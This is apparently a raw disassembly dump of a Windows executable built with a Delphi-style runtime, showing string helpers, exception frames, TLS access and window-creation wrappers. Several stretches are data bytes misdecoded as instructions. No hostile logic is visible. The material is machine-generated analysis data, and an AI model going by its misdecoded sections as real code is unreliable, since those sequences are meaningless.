mov eax [ ebp - 0x4 ]
call sub_404464
pop ecx
pop edx
call sub_405b18
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403fa4
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4045f0
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403ff8
sub_405dd8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405e6f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4046b0
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405e76
lea eax [ ebp - 0x4 ]
call sub_4046b0
retn
mov eax ebx
call sub_404264
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_4048f8
mov eax ebx
call sub_404264
push eax
mov eax [ ebp - 0x4 ]
call sub_40481c
inc eax
push eax
mov eax ebx
call sub_404464
push eax
mov eax [ ebp - 0x4 ]
call sub_40480c
pop ecx
pop edx
call sub_405bf4
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_4046b0
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4048f8
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4046ec
sub_405e7c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405ebf
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4047fc
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405d2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405ec6
lea eax [ ebp - 0x4 ]
call sub_4046b0
retn
sub_405ecc
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_40419c
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_405404
push eax
call sub_401394
mov ecx eax
mov edx esp
mov eax esi
call sub_404094
jmp r-xdata
sub_405f24
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405f8a
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_40135c
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_404214
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402c88
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405f91
lea eax [ ebp - 0x10 ]
call sub_403fa4
retn
xor ebx ebx
sub_405f98
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405fe2
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405fe9
retn
mov eax rw-data
call sub_402ac4
mov eax rw-data
call sub_402ac4
mov eax rw-data
call sub_402ac4
call sub_401bc8
sub_405fec
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404df0
call sub_403094
test al al
je r-xdata
call sub_403188
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_401414
mov [ rw-data ] eax
call sub_40140c
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_4030c4
call sub_401384
call sub_405f24
mov [ rw-data ] eax
call sub_40140c
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_401384
call sub_405f24
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_401404
mov [ rw-data ] eax
sub_4060f4
push ebx
call sub_4060ec
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_4060e0
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403f98
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403f98
sub_406138
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_4060f4
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_406184
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_4060c0
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_406178
mov edx rw-data
mov eax ebx
call sub_403cec
pop ebx
retn
sub_4061c8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4061ed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4061f4
retn
sub_406224
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_406240
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406265
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40626c
retn
sub_40627a
inc eax
add [ ebx ] al
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
js r-xdata
dec esi
outsd
inc eax
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
and ecx [ ecx ]
mov eax eax
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
dec ecx
add [ ebx + 0x7c25ffc0 ] cl
jb r-xdata
jb r-xdata
je r-xdata
sar bh 0x25
je r-xdata
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
dec ecx
add [ ebx + 0x6825ffc0 ] cl
and ecx [ ecx ]
ja EnterCriticalSection
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
sar bh 0x25
pushad
and ecx [ ecx ]
mov eax eax
jmp [ __import_lookup_table_6(kernel32:FindFirstFileA) ]
dec ecx
add [ ebx + 0x7025ffc0 ] cl
and ecx [ ecx ]
mov eax eax
jmp [ EnumCalendarInfoA@IAT ]
add [ ebx - 0x7bda0040 ] cl
and ecx [ ecx ]
mov eax eax
jmp [ CreateEventA@IAT ]
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je FileTimeToDosDateTime
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
sub al 0x63
inc eax
add [ esi ] al
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add [ ebx + 0x7825ffc0 ] cl
and ecx [ ecx ]
mov eax eax
jmp [ __import_lookup_table_6(kernel32:DeleteCriticalSection) ]
mov eax eax
jmp [ __import_lookup_table_6(kernel32:FileTimeToLocalFileTime) ]
add edi [ eax + 0x62 ]
inc eax
add [ ebx + 0x5825ffc0 ] cl
and cl [ ecx ]
mov eax eax
jmp [ RegOpenKeyExA@IAT ]
sub_406eac
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a1c
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a0c
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406f04
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402a1c
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402a0c
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406f5c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_407051
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_407079
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407080
retn
sub_40708c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4070b1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4070b8
retn
sub_4070c4
push 0xf0004916
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add cl dh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dl dh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bl dh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ah dh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ch dh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dh dh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bh dh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add al bh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add cl bh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dl bh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bl bh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ah bh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ch bh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dh bh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bh bh
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add al ah
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add cl ah
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dl ah
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bl ah
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ah ah
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ch ah
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dh ah
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bh ah
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add al ch
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add cl ch
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dl ch
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bl ch
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ah ch
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ch ch
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dh ch
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bh ch
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add al dl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add cl dl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dl dl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bl dl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ah dl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ch dl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dh dl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bh dl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add al bl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add cl bl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dl bl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bl bl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ah bl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ch bl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dh bl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bh bl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add al al
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add cl al
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dl al
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bl al
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ah al
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ch al
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dh al
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bh al
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add al cl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add cl cl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dl cl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bl cl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ah cl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add ch cl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add dh cl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add bh cl
inc [ eax ]
add [ eax + 0x16 ] ch
dec ecx
add [ eax + 0x680000ff ] dh
push ss
dec ecx
add [ ecx + 0x680000ff ] dh
push ss
dec ecx
add [ edx + 0x680000ff ] dh
push ss
dec ecx
add [ ebx + 0x680000ff ] dh
push ss
dec ecx
add [ edi + edi * 8 + 0x16680000 ] dh
dec ecx
add [ ebp + 0x680000ff ] dh
push ss
dec ecx
add [ esi + 0x680000ff ] dh
push ss
dec ecx
add [ edi + 0x680000ff ] dh
push ss
dec ecx
add [ eax + 0x680000ff ] bh
push ss
dec ecx
add [ ecx + 0x680000ff ] bh
push ss
dec ecx
add [ edx + 0x680000ff ] bh
push ss
dec ecx
add [ ebx + 0x680000ff ] bh
push ss
dec ecx
add [ edi + edi * 8 + 0x16680000 ] bh
dec ecx
add [ ebp + 0x680000ff ] bh
push ss
dec ecx
add [ esi + 0x680000ff ] bh
push ss
dec ecx
add [ edi + 0x680000ff ] bh
push ss
dec ecx
add [ eax + 0x680000ff ] ah
push ss
dec ecx
add [ ecx + 0x680000ff ] ah
push ss
dec ecx
add [ edx + 0x680000ff ] ah
push ss
dec ecx
add [ ebx + 0x680000ff ] ah
push ss
dec ecx
add [ edi + edi * 8 + 0x16680000 ] ah
dec ecx
add [ ebp + 0x680000ff ] ah
push ss
dec ecx
add [ esi + 0x680000ff ] ah
push ss
dec ecx
add [ edi + 0x680000ff ] ah
push ss
dec ecx
add [ eax + 0x680000ff ] ch
push ss
dec ecx
add [ ecx + 0x680000ff ] ch
push ss
dec ecx
add [ edx + 0x680000ff ] ch
push ss
dec ecx
add [ ebx + 0x680000ff ] ch
push ss
dec ecx
add [ edi + edi * 8 + 0x16680000 ] ch
dec ecx
add [ ebp + 0x680000ff ] ch
push ss
dec ecx
add [ esi + 0x680000ff ] ch
push ss
dec ecx
add [ edi + 0x680000ff ] ch
push ss
dec ecx
add [ eax + 0x680000ff ] dl
push ss
dec ecx
add [ ecx + 0x550000ff ] dl
mov ebp esp
xor eax eax
push ebp
push sub_4073f9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407400
retn
sub_407f2c
or eax 0x1700407f
jg r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] ah
jg r-xdata
idiv [ eax + eax ]
add al ch
mov dl 0xb9
je r-xdata
add [ eax ] al
add [ eax ] al
add ch ch
jle r-xdata
call sub_40bd20
call sub_4039e0
pop edi
pop esi
pop ebx
retn
push edx
popad
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add ch dh
jle r-xdata
insb
jne r-xdata
add [ eax ] al
add [ eax ] al
add ch bh
jle r-xdata
mov eax ebx
call sub_4027c4
mov esi eax
mov eax esi
imul esi [ esi + 0x65 ] 0x74697257
push ebx
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ edi + edi * 2 + 0x300040 ] dh
add [ eax ] al
adc al [ fs : eax ]
pushfd
xor al 0x40
add [ eax - 0x6bffbfa6 ] cl
pop edx
inc eax
add [ eax - 0x5bffbfcc ] dh
xor al 0x40
add [ edx + ebx * 2 + 0x32080040 ] ah
inc eax
add [ edx * 8 + 0x54240040 ] bh
dec ebp
jne r-xdata
add [ 0x100407f ] al
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
loopne r-xdata
mov edx ebx
call sub_402c68
mov eax esi
pop esi
pop ebx
retn
dec [ ebx + 0x33c68bf0 ]
leave
arpl [ eax + 0x72 ] bp
outsd
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407f2c3f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov ah 0x7f
inc eax
add [ eax + 0x7f ] cl
inc eax
add [ eax ] al
add [ eax ] al
xor ecx ecx
outsb
imul edi [ edx + 0x65 ] r-xdata
sub_407fdc
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_408010
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd20
call sub_4039e0
pop edi
pop esi
pop ebx
retn
sub_408034
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4027c4
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402c68
mov eax esi
pop esi
pop ebx
retn
sub_408054
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_4027e4
call ebx
pop ebx
retn
sub_408080
push ebx
mov ebx eax
mov eax 0xc
call sub_4027c4
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_408054
pop ebx
retn
sub_4080b8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404264
mov ebx eax
mov eax edi
mov edx ebx
call sub_4045f0
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_4080f4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404264
mov ebx eax
mov eax edi
mov edx ebx
call sub_4045f0
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_408130
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_408160
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_408180
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_4081d4
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_408180
test eax eax
jne r-xdata
sub_4081f8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404264
mov ebx eax
mov eax esi
call sub_404464
mov edx eax
mov eax edi
mov ecx ebx
call sub_404094
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharUpperBuffA
sub_40822c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_404264
mov ebx eax
mov eax esi
call sub_404464
mov edx eax
mov eax edi
mov ecx ebx
call sub_404094
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharLowerBuffA
sub_408260
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404264
push eax
mov eax esi
call sub_404464
push eax
mov eax ebx
call sub_404264
push eax
mov eax ebx
call sub_404464
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_408298
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404264
push eax
mov eax esi
call sub_404464
push eax
mov eax ebx
call sub_404264
push eax
mov eax ebx
call sub_404464
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_4082e8
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_408308
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_404264
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_403fa4
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_4044c4
pop ebp
pop edi
pop esi
pop ebx
retn
sub_408358
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_404264
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_404264
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_4083bc
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_4083d2
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_4083d2
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_4083d2
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_408408
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_4083bc
mov edx esi
pop eax
call sub_404094
add esp 0x10
pop esi
retn
sub_408428
or cl cl
jne sub_40845c
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_40845c
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_40845c
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_40845c
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_4084f4
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
